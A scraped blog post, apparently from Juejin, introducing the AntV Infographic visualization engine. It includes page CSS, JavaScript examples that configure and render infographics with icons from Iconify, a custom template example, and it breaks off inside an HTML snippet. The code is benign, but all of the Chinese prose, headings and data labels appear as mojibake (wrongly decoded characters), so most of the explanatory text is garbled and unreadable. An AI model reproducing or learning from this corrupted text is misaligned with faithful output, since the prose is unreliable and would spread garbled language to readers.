a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ä¸€åˆ°å¹´æœ«ï¼Œæ’°å†™å¹´ç»ˆæ€»ç»“æ€»æ˜¯ç»•ä¸å¼€ä¸€é¡¹è´¹æ—¶åˆè´¹åŠ›çš„ä»»åŠ¡â€”â€”ç»˜åˆ¶å›¾è¡¨ã€‚ä½œä¸ºé‡åŒ–å·¥ä½œæˆæœã€ç›´è§‚å‘ˆç°ä¸šåŠ¡è¿›å±•çš„é‡è¦æ–¹å¼ï¼Œå›¾è¡¨æ—¢è¦æ¸…æ™°ä¼ è¾¾ä¿¡æ¯ï¼Œåˆéœ€åœ¨è§†è§‰ä¸Šå¸å¼•çœ¼çƒã€‚ä»¥å¾€ç¬”è€…å¸¸å€ŸåŠ©é˜¿é‡Œ AntV å›¢é˜Ÿæ¨å‡ºçš„Â <code>mcp-server-chart</code>ï¼Œé€šè¿‡å¯¹è¯å¼äº¤äº’å¿«é€Ÿç”ŸæˆåŸºç¡€å›¾è¡¨ï¼Œè™½ç„¶æ–¹ä¾¿ï¼Œä½†å…¶æ ·å¼è¾ƒä¸ºç®€å•ï¼Œéš¾ä»¥åœ¨æ±‡æŠ¥ä¸­è„±é¢–è€Œå‡ºï¼ˆå…³äº<code>mcp-server-chart</code>çš„ä½¿ç”¨å¤§å®¶å¯ä»¥å‚è€ƒç¬”è€…çš„æ–‡ç« <a href="https://juejin.cn/post/7504142780526723081" target="_blank" title="https://juejin.cn/post/7504142780526723081">æ¨èä¸€æ¬¾å®è—MCP Serverâ€”mcp-server-chart, ä»æ­¤å†ä¹Ÿä¸å‘æ„ç»˜åˆ¶å›¾è¡¨å•¦ï¼</a>ï¼‰ã€‚</p>
<p>æ­£ä¸ºæ­¤å‘æ„æ—¶ç¬”è€…å¶ç„¶å‘ç°äº† AntV æ–°æ¨å‡ºçš„ä¿¡æ¯å›¾å¯è§†åŒ–å¼•æ“â€”â€”<strong><a href="https://link.juejin.cn?target=https%3A%2F%2Finfographic.antv.vision%2F" target="_blank" title="https://infographic.antv.vision/" ref="nofollow noopener noreferrer">AntV Infographic</a></strong>ã€‚å®ƒåŒæ ·å‡ºè‡ª AntV å›¢é˜Ÿï¼Œèƒ½å¤Ÿé€šè¿‡ç®€æ´çš„é…ç½®ç”Ÿæˆè®¾è®¡æ„Ÿåè¶³ã€é‡ç‚¹çªå‡ºçš„ä¿¡æ¯å›¾è¡¨ï¼Œæ­£å¥½åˆ‡ä¸­äº†ç¬”è€…åœ¨å›¾è¡¨å±•ç¤ºä¸Šçš„ç—›ç‚¹ã€‚</p>
<p>è¿™ä¹ˆå¥½çš„å·¥å…·ï¼Œè‡ªç„¶ä¸èƒ½ç‹¬äº«ï¼Œæœ¬ç¯‡åˆ†äº«ç¬”è€…å°±æŠŠè¿™ä¸ªå·¥å…·åº“åˆ†äº«ç»™å¤§å®¶ï¼Œ åŒæ—¶ä½œä¸ºé•¿æœŸå…³æ³¨æ™ºèƒ½ä½“å¼€å‘çš„åšä¸»ï¼Œç¬”è€…æ›´è¿›ä¸€æ­¥ç»“åˆÂ <code>AntV Infographic</code>Â ä¸Â <code>vibe coding</code>Â å¿«é€Ÿæ­å»ºäº†ä¸€ä¸ªè½»é‡çº§å›¾è¡¨ç”Ÿæˆæ™ºèƒ½ä½“ã€‚æœ¬æ–‡å°†åˆ†äº«æ•´ä¸ªå®ç°æ€è·¯ä¸è¿‡ç¨‹ï¼Œæ‰‹æŠŠæ‰‹å¸¦ä½ ç”¨Â <strong>AntV + Trae</strong>ï¼Œåœ¨äº”åˆ†é’Ÿå†…æ„å»ºå±äºè‡ªå·±çš„â€œæ™ºèƒ½å›¾è¡¨ç”Ÿæˆå™¨â€ï¼Œè®©å¤§å®¶ä»Šå¹´çš„å¹´ç»ˆæŠ¥å‘Šï¼Œç”¨å›¾è¡¨è¯´è¯ï¼Œé é¢œå€¼å‡ºå½©ï¼(å¸Œæœ›å¤§å®¶å¯ä»¥åˆ°<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fantvis%2Finfographic" target="_blank" title="https://github.com/antvis/infographic" ref="nofollow noopener noreferrer">github</a>ä¸Šç»™Infographic ç‚¹ star æ‰“ callï¼Œæ”¯æŒantvå›¢é˜Ÿå¼€å‘å‡ºæ›´å¤šå®ç”¨ç¾ä¸½çš„å¯è§†åŒ–å›¾è¡¨åŠŸèƒ½~)</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31429ac9e1174724ab3322a4ac4e3141~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765926905&amp;x-signature=fYfCwSi4bmqISpMb%2FgnZYqqONpY%3D" alt="0.png" loading="lazy"/></p>
<h2 data-id="heading-1">ä¸€ã€AntV Infographicç®€ä»‹</h2>
<h3 data-id="heading-2">1.1 ä»€ä¹ˆæ˜¯ä¿¡æ¯å›¾ï¼ˆInfographicï¼‰ï¼Ÿ</h3>
<p>åœ¨æ·±å…¥äº†è§£ AntV Infographic ä¹‹å‰ï¼Œé¦–å…ˆéœ€è¦æ˜ç¡®ä¸€ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼š<strong>ä¿¡æ¯å›¾ï¼ˆInfographicï¼‰</strong> ã€‚</p>
<p>ä¼ ç»Ÿå›¾è¡¨ï¼ˆå¦‚æŠ˜çº¿å›¾ã€æŸ±çŠ¶å›¾ï¼‰çš„æ ¸å¿ƒç›®æ ‡æ˜¯ç²¾ç¡®ã€æ ‡å‡†åŒ–åœ°å‘ˆç°æ•°æ®ã€‚è€Œä¿¡æ¯å›¾åˆ™æ›´è¿›ä¸€æ­¥ï¼Œå®ƒèåˆäº†<strong>æ•°æ®å¯è§†åŒ–</strong>ä¸<strong>è§†è§‰è®¾è®¡</strong>ï¼Œæ—¨åœ¨å°†å¤æ‚çš„æ•°æ®ã€ä¿¡æ¯å’ŒçŸ¥è¯†è½¬åŒ–ä¸ºç›´è§‚çš„ã€å¯Œæœ‰ç¾æ„Ÿçš„å›¾å½¢è¯­è¨€ã€‚å®ƒé€šè¿‡è§†è§‰å…ƒç´ æ¥â€œå‹ç¼©â€ä¿¡æ¯ï¼Œçªå‡ºé‡ç‚¹ã€å™è¿°æ•…äº‹ã€ä¼ è¾¾æ´å¯Ÿï¼Œæœ€ç»ˆç›®æ ‡æ˜¯è®©å—ä¼—â€œçœ‹å¾—æ‡‚ã€è®°å¾—ä½â€ã€‚</p>
<p>ç¬”è€…è¿™é‡Œé€šè¿‡AntVå®˜ç½‘çš„ä¾‹å­æ¥è®©å¤§å®¶ç›´è§‚äº†è§£ä¿¡æ¯å›¾ï¼Œä»¥ä¸‹æ˜¯ä¸€æ®µå…³äºé˜¿é‡Œå·´å·´æŠ€æœ¯èŒçº§çš„æ–‡å­—æè¿°ï¼š</p>
<pre><code class="hljs language-text" lang="text">åœ¨é˜¿é‡Œå·´å·´ï¼ŒæŠ€æœ¯äººçš„èŒçº§ä» P5 åˆ° P10ï¼Œæ¯ä¸€çº§éƒ½å¯¹åº”ç€ä¸åŒçš„èŒè´£ä¸èƒ½åŠ›è¦æ±‚ã€‚  
P5 æ˜¯åˆå…¥èŒåœºçš„æ‰§è¡Œè€…ï¼Œä¸»è¦è´Ÿè´£å®Œæˆå…·ä½“ä»»åŠ¡ï¼Œåœ¨æŒ‡å¯¼ä¸‹å­¦ä¹ å’Œæˆé•¿ï¼›  
P6 æ˜¯ç‹¬ç«‹è´¡çŒ®è€…ï¼Œèƒ½å¤Ÿè‡ªä¸»è§£å†³é—®é¢˜å¹¶äº¤ä»˜æ¨¡å—çº§çš„å·¥ä½œæˆæœï¼›P7 å¼€å§‹æ‰¿æ‹…æ›´å¤æ‚çš„ç³»ç»Ÿè®¾è®¡ä¸é¡¹ç›®æ¨è¿›ï¼Œæˆä¸ºå›¢é˜Ÿä¸­çš„æŠ€æœ¯éª¨å¹²ï¼›  
P8 åˆ™éœ€è¦å…·å¤‡æ¶æ„èƒ½åŠ›ï¼Œä¸»å¯¼å¤§å‹é¡¹ç›®çš„å®æ–½ï¼Œå¹¶åœ¨é¢†åŸŸå†…å½¢æˆå½±å“åŠ›ï¼›  
P9 æ˜¯æŠ€æœ¯ä¸“å®¶æˆ–ç®¡ç†è€…ï¼Œè´Ÿè´£è·¨å›¢é˜Ÿçš„æˆ˜ç•¥è§„åˆ’ä¸èµ„æºæ•´åˆï¼Œæ¨åŠ¨ä¸šåŠ¡åˆ›æ–°ï¼›  
è€Œ P10 ä½œä¸ºè¡Œä¸šé¢†å†›äººç‰©ï¼Œä¸ä»…è¦åœ¨å…¬å¸å†…éƒ¨å¼•é¢†æŠ€æœ¯æ–¹å‘ï¼Œè¿˜è¦åœ¨è¡Œä¸šå†…æ ‘ç«‹æ ‡æ†ï¼Œä¸ºç»„ç»‡å¸¦æ¥æ·±è¿œçš„æŠ€æœ¯å’Œå•†ä¸šä»·å€¼ã€‚
</code></pre>
<p>å¦‚æœå°†å…¶è½¬åŒ–ä¸ºä¿¡æ¯å›¾ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f96c7b8f10814a618c8793ffa33b8d9c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765926905&amp;x-signature=D1GJ5E2uMxmKPxZ0Gefxwj%2BKmmk%3D" alt="1.png" loading="lazy"/></p>
<p>å¯¹æ¯”å¯è§ä¿¡æ¯å›¾é€šè¿‡å±‚æ¬¡åŒ–çš„è§†è§‰è®¾è®¡ï¼Œæå¤§åœ°æå‡äº†ä¿¡æ¯çš„ä¼ è¾¾æ•ˆç‡ä¸è§†è§‰å¸å¼•åŠ›ã€‚</p>
<h3 data-id="heading-3">1.2 AntV Infographic æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p><strong>AntV Infographic</strong>Â æ­£æ˜¯ä¸ºäº†è§£å†³â€œå¦‚ä½•é«˜æ•ˆåˆ›å»ºç²¾ç¾ä¿¡æ¯å›¾â€è€Œç”Ÿçš„æ–°ä¸€ä»£å‰ç«¯å¯è§†åŒ–å¼•æ“ã€‚å®ƒä¸æ˜¯ä¸€ä¸ªç®€å•çš„å›¾è¡¨åº“ï¼Œå°†å¤æ‚æ•°æ®è½¬åŒ–ä¸ºä¼˜é›…ã€å¯äº¤äº’ä¿¡æ¯å›¾çš„å®Œæ•´è§£å†³æ–¹æ¡ˆã€‚è¯¥æ¡†æ¶çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šç”¨æˆ·åªéœ€è¦é€šè¿‡ç®€æ´çš„å£°æ˜å¼JSONé…ç½®æ–¹å¼æè¿°æ•°æ®ä¸æƒ³è¦çš„è§†è§‰å‘ˆç°ï¼Œå¼•æ“ä¾¿ä¼šè‡ªåŠ¨å°†å…¶æ¸²æŸ“ä¸ºé«˜è´¨é‡çš„ä¿¡æ¯å›¾ï¼Œæ— éœ€ä½ æ‰‹åŠ¨è®¡ç®—åƒç´ æˆ–ç»˜åˆ¶å›¾å½¢ã€‚</p>
<h3 data-id="heading-4">1.3 å¦‚ä½•ç”¨ Infographic æ„å»ºä¿¡æ¯å›¾ï¼Ÿ</h3>
<p>InfoGraphicçš„ä½¿ç”¨éå¸¸ç®€å•ï¼Œç”¨æˆ·åªéœ€è¦æŒ‰è§„å®šä¼ å…¥é…ç½®é¡¹ï¼Œå®šä¹‰ç»“æ„ã€è®¾è®¡ã€æ•°æ®ä¸ä¸»é¢˜ï¼ŒInfoGraphicå³å¯è‡ªåŠ¨æ ¹æ®ç”¨æˆ·çš„é…ç½®ç»˜åˆ¶å‡ºç²¾ç¾çš„ä¿¡æ¯å›¾ã€‚å¯ä»¥è¯´Infographicçš„æ•´ä¸ªè¿‡ç¨‹å›´ç»•ä¸‰ä¸ªæ ¸å¿ƒé…ç½®é¡¹å±•å¼€ï¼š</p>
<ul>
<li>
<p><strong>è®¾è®¡ (<code>design</code>)</strong> ï¼šå®šä¹‰ä¿¡æ¯å›¾çš„è§†è§‰æ ·å¼ï¼Œå‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Finfographic.antv.vision%2Flearn%2Fdesign" target="_blank" title="https://infographic.antv.vision/learn/design" ref="nofollow noopener noreferrer">infographic.antv.vision/learn/desigâ€¦</a> äº†è§£æ›´å¤šã€‚</p>
<ul>
<li><code>structure</code>ï¼šå¸ƒå±€ä¸ç»„ç»‡æ–¹å¼ï¼ˆå¦‚åˆ—è¡¨ã€ç½‘æ ¼ï¼‰ã€‚</li>
<li><code>title</code>ï¼šæ ‡é¢˜çš„æ ·å¼è®¾è®¡ã€‚</li>
<li><code>item</code>ï¼šæ¯ä¸ªæ•°æ®å•å…ƒçš„è§†è§‰æ ·å¼ï¼ˆå¦‚å¡ç‰‡ã€ç®­å¤´å›¾ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>æ•°æ® (<code>data</code>)</strong> ï¼šå¡«å…¥è¦å±•ç¤ºçš„å…·ä½“å†…å®¹ï¼Œå‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Finfographic.antv.vision%2Flearn%2Fdata" target="_blank" title="https://infographic.antv.vision/learn/data" ref="nofollow noopener noreferrer">infographic.antv.vision/learn/data</a> äº†è§£æ›´å¤šã€‚</p>
<ul>
<li>æ”¯æŒä¸€ç»´åˆ—è¡¨æ•°æ®ï¼ˆå¦‚ä¸Šå›¾ç¤ºä¾‹ï¼‰å’Œå±‚çº§æ•°æ®ã€‚</li>
<li>æ¯ä¸ªæ•°æ®é¡¹å¯åŒ…å«æ ‡ç­¾ã€æè¿°ã€æ—¶é—´ã€å›¾æ ‡ç­‰å­—æ®µã€‚</li>
</ul>
</li>
<li>
<p><strong>ä¸»é¢˜ (<code>theme</code>)</strong> ï¼šæ§åˆ¶å…¨å±€è§†è§‰é£æ ¼ï¼Œå‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Finfographic.antv.vision%2Flearn%2Ftheme" target="_blank" title="https://infographic.antv.vision/learn/theme" ref="nofollow noopener noreferrer">infographic.antv.vision/learn/theme</a> äº†è§£æ›´å¤šã€‚</p>
<ul>
<li>é…ç½®ä¸»è‰²ã€è‰²æ¿ã€èƒŒæ™¯ç­‰ã€‚</li>
<li>è‡ªå®šä¹‰æ–‡æœ¬ã€å›¾å½¢ç­‰å…ƒç´ çš„æ ·å¼ã€‚</li>
<li>åº”ç”¨æ‰‹ç»˜é£ç­‰é£æ ¼åŒ–æ•ˆæœã€‚</li>
</ul>
</li>
</ul>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªå®Œæ•´çš„ä»£ç ç¤ºä¾‹ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªåŒ…å«ä¸‰ä¸ªæ­¥éª¤çš„â€œè®¡åˆ’è¿›å±•â€å›¾:</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> {
  <span class="hljs-title class_">Infographic</span>,
  registerResourceLoader,
  loadSVGResource,
} <span class="hljs-keyword">from</span> <span class="hljs-string">'@antv/infographic'</span>;

<span class="hljs-title function_">registerResourceLoader</span>(<span class="hljs-keyword">async</span> (config) =&gt; {
  <span class="hljs-keyword">const</span> {data} = config;
  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`https://api.iconify.design/<span class="hljs-subst">${data}</span>.svg`</span>);
  <span class="hljs-keyword">const</span> text = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">text</span>();
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">loadSVGResource</span>(text);
});

<span class="hljs-keyword">const</span> infographic = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Infographic</span>({
  <span class="hljs-attr">container</span>: <span class="hljs-string">'#container'</span>,
  <span class="hljs-attr">width</span>: <span class="hljs-string">'100%'</span>,
  <span class="hljs-attr">height</span>: <span class="hljs-string">'100%'</span>,
  <span class="hljs-attr">editable</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">padding</span>: <span class="hljs-number">30</span>,
  <span class="hljs-attr">design</span>: {
    <span class="hljs-attr">title</span>: {
      <span class="hljs-attr">type</span>: <span class="hljs-string">'default'</span>,
      <span class="hljs-attr">width</span>: <span class="hljs-number">300</span>,
    },
    <span class="hljs-attr">structure</span>: {
      <span class="hljs-attr">type</span>: <span class="hljs-string">'list-row'</span>,
      <span class="hljs-attr">gap</span>: <span class="hljs-number">0</span>,
      <span class="hljs-attr">zigzag</span>: <span class="hljs-literal">true</span>,
    },
    <span class="hljs-attr">item</span>: {
      <span class="hljs-attr">type</span>: <span class="hljs-string">'horizontal-icon-arrow'</span>,
    },
  },
  <span class="hljs-attr">theme</span>: <span class="hljs-string">'dark'</span>,
  <span class="hljs-attr">themeConfig</span>: {
    <span class="hljs-attr">palette</span>: [<span class="hljs-string">'#61DDAA'</span>, <span class="hljs-string">'#F6BD16'</span>, <span class="hljs-string">'#F08BB4'</span>],
    <span class="hljs-attr">base</span>: {
      <span class="hljs-attr">text</span>: {
        <span class="hljs-string">'font-family'</span>: <span class="hljs-string">'851tegakizatsu'</span>,
      },
    },
    <span class="hljs-attr">stylize</span>: {
      <span class="hljs-attr">type</span>: <span class="hljs-string">'rough'</span>,
    },
  },
  <span class="hljs-attr">data</span>: {
    <span class="hljs-attr">title</span>: <span class="hljs-string">'è®¡åˆ’è¿›å±•'</span>,
    <span class="hljs-attr">items</span>: [
      {
        <span class="hljs-attr">label</span>: <span class="hljs-string">'æ­¥éª¤ 1'</span>,
        <span class="hljs-attr">desc</span>: <span class="hljs-string">'å¼€å§‹'</span>,
        <span class="hljs-attr">time</span>: <span class="hljs-string">'Last Day'</span>,
        <span class="hljs-attr">icon</span>: <span class="hljs-string">'mdi/rocket-launch'</span>,
      },
      {
        <span class="hljs-attr">label</span>: <span class="hljs-string">'æ­¥éª¤ 2'</span>,
        <span class="hljs-attr">desc</span>: <span class="hljs-string">'è¿›è¡Œä¸­'</span>,
        <span class="hljs-attr">time</span>: <span class="hljs-string">'Today'</span>,
        <span class="hljs-attr">icon</span>: <span class="hljs-string">'mdi/progress-clock'</span>,
      },
      {<span class="hljs-attr">label</span>: <span class="hljs-string">'æ­¥éª¤ 3'</span>, <span class="hljs-attr">desc</span>: <span class="hljs-string">'å®Œæˆ'</span>, <span class="hljs-attr">time</span>: <span class="hljs-string">'Tomorrow'</span>, <span class="hljs-attr">icon</span>: <span class="hljs-string">'mdi/trophy'</span>},
    ],
  },
});

infographic.<span class="hljs-title function_">render</span>();
</code></pre>
<p><strong>ä»£ç è¦ç‚¹è§£æ:</strong></p>
<ul>
<li><strong>èµ„æºåŠ è½½å™¨</strong>ï¼šé€šè¿‡Â <code>registerResourceLoader</code>Â ä» Iconify æŒ‰éœ€æ‹‰å– SVGã€‚</li>
<li><strong>ç¼–è¾‘å™¨</strong>ï¼šè®¾ç½®Â <code>editable: true</code>Â å¯ç”¨äº¤äº’å¼ç¼–è¾‘åŠŸèƒ½ã€‚</li>
<li><strong>è®¾è®¡</strong>ï¼š<code>design</code>Â å­—æ®µè‡ªå®šä¹‰æ ‡é¢˜ã€ç»“æ„ä¸æ•°æ®é¡¹ç±»å‹åŠå‚æ•°ã€‚</li>
<li><strong>ä¸»é¢˜</strong>ï¼šåˆ‡æ¢æš—è‰²ä¸»é¢˜å¹¶ç”¨Â <code>themeConfig</code>Â é…ç½®è‰²æ¿ã€å­—ä½“ã€é£æ ¼åŒ–ã€‚</li>
<li><strong>æ•°æ®</strong>ï¼šä¼ å…¥æ ‡é¢˜ä¸æ•°æ®é¡¹ï¼ˆæ ‡ç­¾ã€æè¿°ã€æ—¶é—´ã€å›¾æ ‡ï¼‰ã€‚</li>
</ul>
<p>æœ€ç»ˆç»˜åˆ¶çš„å›¾ç‰‡æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7cd1bd3f21ab4c52b79592ec625d0de7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765926905&amp;x-signature=xHoH%2FrCbJaMrV1JZPvQaPEu29jQ%3D" alt="2.png" loading="lazy"/></p>
<h3 data-id="heading-5">1.4 Infographicæ¨¡æ¿åŸºæœ¬ä»‹ç»</h3>
<p>å¯¹äºå¸¸è§çš„å›¾è¡¨ç±»å‹ï¼Œæ¯æ¬¡éƒ½ä»å¤´é…ç½®Â <code>design</code>Â æ˜¾ç„¶æ•ˆç‡ä¸é«˜ã€‚ä¸ºæ­¤ï¼ŒInfographic æä¾›äº†<strong>æ¨¡æ¿ï¼ˆTemplateï¼‰</strong> åŠŸèƒ½ã€‚ç”¨æˆ·å¯ä»¥å°†ä¸€å¥—æˆç†Ÿçš„Â <code>design</code>Â é…ç½®ä¿å­˜ä¸ºæ¨¡æ¿ï¼Œä»¥ä¾¿å¤ç”¨ã€‚</p>
<ol>
<li>
<p><strong>æ³¨å†Œä¸ä½¿ç”¨è‡ªå®šä¹‰æ¨¡æ¿:</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> {registerTemplate, <span class="hljs-title class_">Infographic</span>} <span class="hljs-keyword">from</span> <span class="hljs-string">'@antv/infographic'</span>;

<span class="hljs-title function_">registerTemplate</span>(<span class="hljs-string">'simple-list'</span>, {
  <span class="hljs-attr">design</span>: {
    <span class="hljs-attr">structure</span>: <span class="hljs-string">'list-row'</span>,
    <span class="hljs-attr">item</span>: <span class="hljs-string">'simple'</span>,
  },
});

<span class="hljs-keyword">new</span> <span class="hljs-title class_">Infographic</span>({
  <span class="hljs-comment">// å…¶ä»–é…ç½®é¡¹...</span>
  <span class="hljs-attr">template</span>: <span class="hljs-string">'simple-list'</span>,
});
</code></pre>
</li>
<li>
<p><strong>ä½¿ç”¨å®˜æ–¹æ¨¡æ¿:</strong></p>
</li>
</ol>
<p>é™¤äº†è‡ªå®šä¹‰æ¨¡æ¿çš„æ–¹æ³•å¤–ï¼Œé‰´äºç°å®ç”Ÿæ´»ä¸­æœ‰è®¸å¤šè®¾è®¡å¥½çš„ä¿¡æ¯å±•ç¤ºå›¾è¡¨ç»„ä»¶ï¼Œå¤§å®¶ç›´æ¥åœ¨ä¸Šé¢æ›¿æ¢æ•°æ®å‘ˆç°çš„æ•ˆæœå¾€å¾€æ¯”è‡ªå®šä¹‰çš„å›¾è¡¨ç»„ä»¶å±•ç¤ºæ•ˆæœè¿˜è¦å¥½ã€‚åŸºäºæ­¤AntV å›¢é˜Ÿå·²ç»ä¸ºæˆ‘ä»¬å‡†å¤‡äº†ä¸Šç™¾ç§ç²¾å¿ƒè®¾è®¡çš„æ¨¡æ¿ï¼Œè¦†ç›–äº†æ—¶é—´è½´ã€ç»„ç»‡æ¶æ„ã€äº§å“è·¯çº¿å›¾ç­‰å¤šç§åœºæ™¯ã€‚ä½ å¯ä»¥åœ¨Â <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Finfographic.antv.vision%2Fexamples" target="_blank" title="https://infographic.antv.vision/examples" ref="nofollow noopener noreferrer">å®˜æ–¹ç¤ºä¾‹åº“</a></strong>Â ä¸­æµè§ˆå¹¶æ‰¾åˆ°å¿ƒä»ªçš„æ ·å¼ï¼Œç›´æ¥å¤åˆ¶å…¶æ¨¡æ¿åç§°å¹¶å°†æ•°æ®ä¿®æ”¹ä¸ºè‡ªå·±çš„æ•°æ®å³å¯ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f7331d4b1fb3437ea537ac1fdc67758c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765926905&amp;x-signature=pZQ%2BQtPx8Nkb958JLSUufDInK1o%3D" alt="3.png" loading="lazy"/></p>
<p>ä¾‹å¦‚ï¼Œä»¥ä¸‹ä»£ç ä½¿ç”¨å®˜æ–¹Â <code>list-row-simple-horizontal-arrow</code>Â æ¨¡æ¿ï¼Œåœ¨çº¯HTMLç¯å¢ƒä¸­å¿«é€Ÿç”Ÿæˆäº†ä¸€ä¸ªæ­¥éª¤æµç¨‹å›¾ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
